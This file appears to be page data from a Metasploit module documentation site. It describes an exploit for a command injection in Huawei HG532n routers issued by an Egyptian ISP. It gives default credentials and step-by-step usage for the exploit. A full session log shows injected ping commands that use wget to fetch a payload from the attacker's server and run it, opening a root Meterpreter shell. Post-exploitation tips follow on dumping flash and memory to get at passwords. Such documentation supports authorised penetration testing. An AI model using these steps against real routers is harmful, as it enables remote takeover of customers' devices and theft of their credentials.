{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/huawei_hg532n_cmdinject","result":{"data":{"moduleMetadataJson":{"id":"1d25104c-54e5-5247-bf9f-f484868882ee","name":"Huawei HG532n Command Injection","fullname":"exploit/linux/http/huawei_hg532n_cmdinject","description":"This module exploits a command injection vulnerability in the Huawei\n        HG532n routers provided by TE-Data Egypt, leading to a root shell.\n\n        The router's web interface has two kinds of logins, a \"limited\" user:user\n        login given to all customers and an admin mode. The limited mode is used\n        here to expose the router's telnet port to the outside world through NAT\n        port-forwarding.\n\n        With telnet now remotely accessible, the router's limited \"ATP command\n        line tool\" (served over telnet) can be upgraded to a root shell through\n        an injection into the ATP's hidden \"ping\" command.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/huawei_hg532n_cmdinject","documentationSlug":"/modules/documentation/exploit/linux/http/huawei_hg532n_cmdinject"},"documentation":{"html":"<h1 id=\"hg532n-command-injection-exploit\" style=\"position:relative;\"><a href=\"#hg532n-command-injection-exploit\" aria-label=\"hg532n command injection exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HG532n Command Injection Exploit</h1>\n<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>The Huawei HG532n routers, shipped by TE-Data Egypt, are vulnerable to a command\ninjection exploit in the hidden ping command of their limited shell interface.</p>\n<p>Affected hardware/software version strings:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">   Manufacturer: Huawei Technologies Co., Ltd.\n   Product Style: HG532n\n   SN: B7J7SB9381703791\n   IP: 192.168.1.1\n   Hardware Version: HG532EAM1HG530ERRAMVER.B\n   Software Version: V100R001C105B016 TEDATA</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>TE-Data, the incumbent ISP operator in Egypt, provided this router to customers\nby default. The web interface has two kinds of logins, a \"limited\" user:user login\ngiven to all customers, and an admin mode used by company's technical staff. For\nhosts within the ISP network, this web interface is remotely accessible.</p>\n<p>The web interface's user mode provides very limited functionality â€“ only WIFI\npasswords change and NAT port-forwarding. Nonetheless by port forwarding the\nrouter's own (filtered) telnet port, it becomes remotely accessible. All installed\nrouters have a telnet password of admin:admin.</p>\n<p>Due to the ISP's <em>encrypted</em> runtime router configuration [*] though, the telnet\ndaemon does not provide a direct linux shell. Rather a very limited custom shell\nis provided instead: \"ATP command line tool\". The limited shell has a ping command\nwhich falls back to the system shell though (<code class=\"language-text\">ping %s &gt; /var/res_ping</code>). We exploit\nthat through command injection to gain Meterpreter root access.</p>\n<p>[*] <code class=\"language-text\">&lt;X_ServiceManage TelnetEnable=&quot;1&quot; ConsoleEnable=&quot;&quot; ../&gt;</code> at <code class=\"language-text\">/etc/defaultcfg.xml</code></p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>With an attacker node that resides within the ISP network, do:</p>\n<ul>\n<li>Set <code class=\"language-text\">payload</code> to <code class=\"language-text\">linux/mipsbe/meterpreter_reverse_tcp</code></li>\n<li>Set <code class=\"language-text\">RHOST</code> to the target router's IP</li>\n<li>Set <code class=\"language-text\">SRVHOST</code> to your local machine's <strong>external</strong> IP. The module starts its\nown HTTP server; this is the IP the exploit will use to fetch the MIPSBE\npayload from, through an injected <code class=\"language-text\">wget</code> command. Make sure this address is\naccessible from outside.</li>\n<li>Set <code class=\"language-text\">SRVPORT</code> to the desired local HTTP server port number. Make sure this\nport is accessible from outside.</li>\n<li>Set <code class=\"language-text\">LHOST</code> to your machine's <strong>external</strong> IP address. A successful Reverse\nTCP payload will ring us back to this IP.</li>\n<li>Set <code class=\"language-text\">LPORT</code> to an arbitrary port number that is accessible from outside\nnetworks. Metasploit will open a listener on that port and wait for the\npayload to connect back to us.</li>\n<li>Set <code class=\"language-text\">VERBOSE</code> to <code class=\"language-text\">true</code> if you want to see much more verbose output (Detailed\ninjected telnet commands output).</li>\n</ul>\n<p>TE-Data firmware ships with the <code class=\"language-text\">user:user</code> login credentials by default.\nThey offer limited functionality, but they are enough for our purposes.\nIn case you want want to change these, set <code class=\"language-text\">HttpUsername</code> and <code class=\"language-text\">HttpPassword</code>\nappropriately.</p>\n<p>Now everything should be ready to run the exploit. Enjoy your Meterpreter\nsession :-)</p>\n<p>Alternatively, you can avoid hosting the payload executable from within the\nmodule's own HTTP server and host it externally. To do so, first generate\nthe payload ELF executable using <code class=\"language-text\">msfvenom</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ msfvenom --format elf --arch mipsbe --platform linux --payload linux/mipsbe/meterpreter/reverse_tcp --out payload.elf LHOST=&#39;41.34.32.121&#39; LPORT=4444\n\nNo encoder or badchars specified, outputting raw payload\nPayload size: 212 bytes\nFinal size of elf file: 296 bytes\nSaved as: payload.elf</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Then host the <code class=\"language-text\">payload.elf</code> file on an external, direct-access, web\nserver. Afterwards set <code class=\"language-text\">DOWNHOST</code> to the external server's IP address\nand <code class=\"language-text\">DOWNFIILE</code> to the payload's path on that server. Run the exploit\nafterwards.</p>\n<h2 id=\"live-scenario-verbose\" style=\"position:relative;\"><a href=\"#live-scenario-verbose\" aria-label=\"live scenario verbose permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Live Scenario (Verbose)</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ msfconsole\nmsf &gt; use exploit/linux/http/huawei_hg532n_cmdinject\n\nmsf exploit(huawei_hg532n_cmdinject) &gt; set RHOST 197.38.98.11\nRHOST =&gt; 197.38.98.11\n\nmsf exploit(huawei_hg532n_cmdinject) &gt; set SRVHOST 41.34.32.121\nSRVHOST =&gt; 41.34.32.121\n\nmsf exploit(huawei_hg532n_cmdinject) &gt; set LHOST 41.34.32.121\nLHOST =&gt; 41.34.32.121\n\nmsf exploit(huawei_hg532n_cmdinject) &gt; set VERBOSE true\nVERBOSE =&gt; true\n\nmsf exploit(huawei_hg532n_cmdinject) &gt; exploit\n[*] Exploit running as background job.\nmsf exploit(huawei_hg532n_cmdinject) &gt;\n[-] Handler failed to bind to 41.34.32.121:4444:-  -\n[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] Validating router&#39;s HTTP server (197.38.98.11:80) signature\n[+] Good. Router seems to be a vulnerable HG532n device\n[+] Telnet port forwarding succeeded; exposted telnet port = 33552\n[*] Connecting to just-exposed telnet port 33552\n[+] Connection succeeded. Passing telnet credentials\n[*] Received new reply token = &#39;ï¿½ï¿½\u0001ï¿½ï¿½\u0003\nPassword:&#39;\n[*] Received new reply token = &#39;Password:&#39;\n[+] Credentials passed; waiting for prompt &#39;HG520b&gt;&#39;\n[*] Received new reply token = &#39;HG520b&gt;&#39;\n[+] Prompt received. Telnet access fully granted!\n[*] Starting web server; hostinig /MDGuEPiUDBRXD\n[*] Using URL: http://0.0.0.0:8080/MDGuEPiUDBRXD\n[*] Local IP: http://192.168.1.3:8080/MDGuEPiUDBRXD\n[*] Runninig command on target: wget -g -v -l /tmp/zjtmztfz -r /MDGuEPiUDBRXD -P8080 41.34.32.121\n[*] Received new reply token = &#39;p&#39;\n[*] Received new reply token = &#39;ing ?;wget${IFS}-g${IFS}-v${IFS}-l${IFS}/tmp/zjtmztfz${IFS}-r${IFS}/MDGuEPiUDBRXD${IFS}-P8080${IFS}41.34.32.121;true&#39;\n[*] Received new reply token = &#39;ping: bad address &#39;?&#39;&#39;\n[+] HTTP server received request. Sending payload to victim\n[*] Received new reply token = &#39;The IP is [41.34.32.121]&#39;\n[*] Received new reply token = &#39;Success\nping result:\nHG520b&gt;&#39;\n[+] Command executed succesfully\n[*] Runninig command on target: chmod 777 /tmp/zjtmztfz\n[*] Received new reply token = &#39;p&#39;\n[*] Received new reply token = &#39;ing ?;chmod${IFS}777${IFS}/tmp/zjtmztfz;trueping: bad address &#39;?&#39;\n\nSuccess\nping result:\nHG520b&gt;&#39;\n[+] Command executed succesfully\n[*] Runninig command on target: /tmp/zjtmztfz\n[*] Received new reply token = &#39;p&#39;\n[*] Received new reply token = &#39;ing ?;/tmp/zjtmztfz&amp;trueping: bad address &#39;?&#39;\n\nSuccess\nping result:\nHG520b&gt;&#39;\n[+] Command executed succesfully\n[*] Runninig command on target: rm /tmp/zjtmztfz\n[*] Received new reply token = &#39;p&#39;\n[*] Received new reply token = &#39;ing ?;rm${IFS}/tmp/zjtmztfz;trueping: bad address &#39;?&#39;\n\nSuccess\nping result:\nHG520b&gt;&#39;\n[+] Command executed succesfully\n[*] Waiting for the payload to connect back ..\n[*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 197.38.98.11:50097) at 2017-04-15 16:45:05 +0200\n[+] Payload connected!\n[*] Server stopped.\n\nmsf exploit(huawei_hg532n_cmdinject) &gt; sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0\nmeterpreter &gt; sysinfo\nComputer     : 192.168.1.1\nOS           :  (Linux 2.6.21.5)\nArchitecture : mips\nMeterpreter  : mipsbe/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"post-exploitation\" style=\"position:relative;\"><a href=\"#post-exploitation\" aria-label=\"post exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Post-exploitation</h2>\n<h3 id=\"mips-toolchain\" style=\"position:relative;\"><a href=\"#mips-toolchain\" aria-label=\"mips toolchain permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MIPS toolchain</h3>\n<p>Beside a basic meterpreter shell, you can compile your own C programs and\nrun them on the device! Download the <a href=\"https://sourcery.mentor.com/GNUToolchain/package13838/public/mips-linux-gnu/mips-2016.05-8-mips-linux-gnu-i686-pc-linux-gnu.tar.bz2\">Sourcery CodeBench Lite</a>\nMIPS toolchain then compile your programs in the following manner:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">#!/bin/bash\n\nTOOLCHAIN_ROOT=mips-2016.05\nCROSS_COMPILE=$TOOLCHAIN_ROOT/bin/mips-linux-gnu-\n\n${CROSS_COMPILE}gcc                                                     \\\n                --sysroot=${TOOLCHAIN_ROOT}/mips-linux-gnu/libc/uclibc/ \\\n                -Wl,-dynamic-linker,/lib/ld-uClibc.so.0                 \\\n                -static                                                 \\\n                program.c\n\n${CROSS_COMPILE}strip -s a.out -o payload</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Then call <code class=\"language-text\">wget</code> to download and run the generated <code class=\"language-text\">payload</code> above. Be careful\nof the device's own wget call conventions below.</p>\n<h3 id=\"a-special-wget-command\" style=\"position:relative;\"><a href=\"#a-special-wget-command\" aria-label=\"a special wget command permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>A special wget command</h3>\n<p>Huawei crafted their own <code class=\"language-text\">wget</code> implementation inside the shipped version of\nbusybox. It has the following syntax:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; shell\nProcess 17951 created.\nChannel 1 created.\nwget -h\nwget: invalid option -- h\nBusyBox vv1.9.1 (2012-10-16 22:24:47 CST) multi-call binary\n\nUsage: wget [OPTION]... HOST\n\nwget download and upload a file via HTTP\n\nOptions:\n\t-g    Download\n\t-s    Upload\n\t-v    Verbose\n\t-u    Username to be used\n\t-p    Password to be used\n\t-l    Local file path\n\t-r    Remote file path\n\t-P    Port to be used, optional\n\t-B    Bind local ip, optional\n\t-A    Remote resolved ip, optional\n\t-b    Transfer start position\n\t-e    Transfer length\n\t-m    Max transfer size\n\t-c    Compress downloaded file</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"rootfs-image\" style=\"position:relative;\"><a href=\"#rootfs-image\" aria-label=\"rootfs image permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Rootfs image</h3>\n<p>Extract <code class=\"language-text\">/dev/mtdblock[0123]</code> images from the device to gain full raw access to\nthe flash. Use <a href=\"https://github.com/devttys0/binwalk\">binwalk</a> on the extracted\n<code class=\"language-text\">/dev/mtdblock3</code> contents to get a full squashfs rootfs image.</p>\n<p>The most important files in the rootfs image are encrypted though. Nonetheless,\nby dumping <code class=\"language-text\">/dev/mem</code> contents and looking for the juicy bits, you will find\nall the necessary information needed ;-)</p>\n<p>Note that even after configuration decryption, all the now-plaintext important\nconfiguration files store passwords in a SHA-256 hashed form. Be creative.</p>"}}},"pageContext":{"id":"1d25104c-54e5-5247-bf9f-f484868882ee"}}}